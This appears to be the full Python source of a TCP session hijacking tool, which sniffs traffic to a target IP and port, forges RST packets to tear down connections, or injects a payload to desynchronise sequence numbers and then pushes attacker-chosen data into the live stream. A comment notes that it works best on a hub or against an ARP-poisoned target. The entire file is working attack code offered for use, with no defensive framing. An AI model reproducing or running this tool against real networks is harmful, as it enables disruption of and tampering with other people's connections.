
import os
import sys
import readline
import threading
import time
from packet import ppcap, TCPPacket

class TCPHijack:
	def __init__(self):
		if (len(sys.argv) != 4):
			print("Usage: %s <dev> <ip> <port>" % sys.argv[0])
			exit()
		self.dev = sys.argv[1]
		self.ip = sys.argv[2]
		self.port = int(sys.argv[3])
		self.menu()
		self.hijack()

	'''
		subroutine 'menu' takes care of figuring out
		the path of the program.
	'''
	def menu(self):
		while (not hasattr(self, "option")):
			print("1. Reset the stream.")
			print("2. Control the stream.")
			print("3. Exit.")
			line = input("TCPHijack: ")
			if (line == "1"):
				self.option = 1
			elif (line == "2"):
				self.option = 2
				while (not hasattr(self, "input_method")):
					print("1. Provide input from the command line.")
					print("2. Provide input from a file.")
					print("3. Go back.")
					line = input("TCPHijack: ")
					if (line == "1"):
						self.input_method = 1
					elif (line == "2"):
						print("Please enter the path of the file.")
						_file = input("TCPHijack: ")
						if (os.path.exists(_file)):
							self.input_method = 2
							self.file = _file
						else:
							print("File %s do not exist." % _file)
					elif (line == "3"):
						del(self.option)
						break
					else:
						print("Unrecognized option: " + line)
			elif (line == "3"):
				exit()
			else:
				print("Unrecognized option: " + line)

	def hijack(self):
		handle = ppcap()
		handle.open_live(self.dev, 1514, 1, 0)
		handle.lookupnet(self.dev)
		handle.compile("dst %s and tcp port %d" % (self.ip, self.port))
		handle.setfilter()
		handle.setnonblock(1)
		if (self.option == 1):
			self.reset_stream(handle)
		elif (self.option == 2):
			self.control_stream_o(handle)

	def reset_stream(self, handle):
		print("Waiting for ACK packet to reset the stream..")
		while 1:
			packet = handle.next()
			flags = packet.tcp_get_flags()
			if (flags["ack"] and not flags["syn"]
				and not len(packet.tcp_payload)):
				args = {
					"mac_src"	  : tuple([int(i, 16) for i in packet.ethernet_dst.split(":")]),
					"mac_dst"	  : tuple([int(i, 16) for i in packet.ethernet_src.split(":")]),
					"ip_source"   : packet.ip_dest,
					"ip_dest"	  : packet.ip_source,
					"tcp_src"	  : packet.tcp_dst,
					"tcp_dst"	  : packet.tcp_src,
					"tcp_seq"	  : packet.tcp_seq_ack,
				}
				pkt = TCPPacket(args)
				pkt.tcp_set_flags(rst = 1)
				pkt.calc_len()
				pkt.calc_csum()

				for i in range(5):
					pkt.sendto(pkt.to_bytes(), (self.dev, 0))
				print("Stream has been reseted.")
				break

	'''
		Routine 'control_stream_i' is a separate thread entry point
		that handles incoming packets. It is to be used with
		'control_stream'. It makes sure that our ACK number is correct.
	'''
	def control_stream_i(self, handle, lock):
		pkt = TCPPacket()
		while 1:
			packet = handle.next()
			if (not len(packet.tcp_payload)): continue
			lock.acquire()
			self.tcp_ack += len(packet.tcp_payload)

			pkt.ethernet_src 	= tuple([int(i, 16) for i in packet.ethernet_dst.split(":")])
			pkt.ethernet_dst 	= tuple([int(i, 16) for i in packet.ethernet_src.split(":")])
			pkt.ip_source 		= packet.ip_dest
			pkt.ip_dest 		= packet.ip_source
			pkt.tcp_src			= packet.tcp_dst
			pkt.tcp_dst			= packet.tcp_src
			pkt.tcp_seq 		= self.tcp_seq
			pkt.tcp_seq_ack		= self.tcp_ack
			pkt.tcp_set_flags(ack = 1)
			pkt.calc_len()
			pkt.calc_csum()
			pkt.sendto(pkt.to_bytes(), (self.dev, 0))
			lock.release()
	'''
		Routine 'control_stream_o' handles outgoing packets. It takes either
		input from 'stdin' or from a file. It also increments the sequence
		number after transmitting.
	'''
	def control_stream_o(self, handle):
		print("Waiting for ACK packet to inject payload..")
		while 1:
			packet = handle.next()
			flags = packet.tcp_get_flags()
			if (flags["ack"] and not flags["syn"]
				and not len(packet.tcp_payload)):
				'''
					We only hijack the session on an ACK packet without a payload.
					This is because it becomes a race condition of responding to a
					payload packet between the attacker and the target host. The chance
					of this is large being connected to a HUB, large if targetting yourself,
					and low if the target is ARP poisoned. The packet below will screw up the
					stream at both sides, after that you can send data freely.
				'''
				args = {
					"mac_src"	  : tuple([int(i, 16) for i in packet.ethernet_dst.split(":")]),
					"mac_dst"	  : tuple([int(i, 16) for i in packet.ethernet_src.split(":")]),
					"ip_source"   : packet.ip_dest,
					"ip_dest"	  : packet.ip_source,
					"tcp_src"	  : packet.tcp_dst,
					"tcp_dst"	  : packet.tcp_src,
					"tcp_seq"	  : packet.tcp_seq_ack,
					"tcp_seq_ack" : packet.tcp_seq,
					"payload"	  : b"\x41" * 40
				}
				pkt = TCPPacket(args)
				pkt.tcp_set_flags(push = 1, ack = 1)
				pkt.calc_len()
				pkt.calc_csum()
				pkt.sendto(pkt.to_bytes(), (self.dev, 0))
				break
		print("Payload injected. Targets kernel is now -40 SEQ on transmission.")
		# Save a the SEQ and ACK numbers
		self.tcp_seq = packet.tcp_seq_ack + 40
		self.tcp_ack = packet.tcp_seq
		# Create a lock object
		lock = threading.Lock()
		# Start the input stream handler
		tid = threading.Thread(target = self.control_stream_i, args = (handle, lock))
		tid.start()
		if (self.input_method == 1):
			while 1:
				pkt.tcp_seq = self.tcp_seq
				pkt.tcp_payload = input("TCPHijack: ").encode("utf-8")
				lock.acquire()
				pkt.tcp_seq_ack = self.tcp_ack
				pkt.calc_len()
				pkt.calc_csum()
				pkt.sendto(pkt.to_bytes(), (self.dev, 0))
				lock.release()
				self.tcp_seq += len(pkt.tcp_payload)
		else:
			with open(self.file, "rt") as f:
				for line in f:
					pkt.tcp_seq = self.tcp_seq
					lock.acquire()
					pkt.tcp_seq_ack = self.tcp_ack
					pkt.tcp_payload = line.encode("utf-8")
					pkt.calc_len()
					pkt.calc_csum()
					pkt.sendto(pkt.to_bytes(), (self.dev, 0))
					lock.release()
					self.tcp_seq += len(pkt.tcp_payload)
					time.sleep(1)

obj = TCPHijack()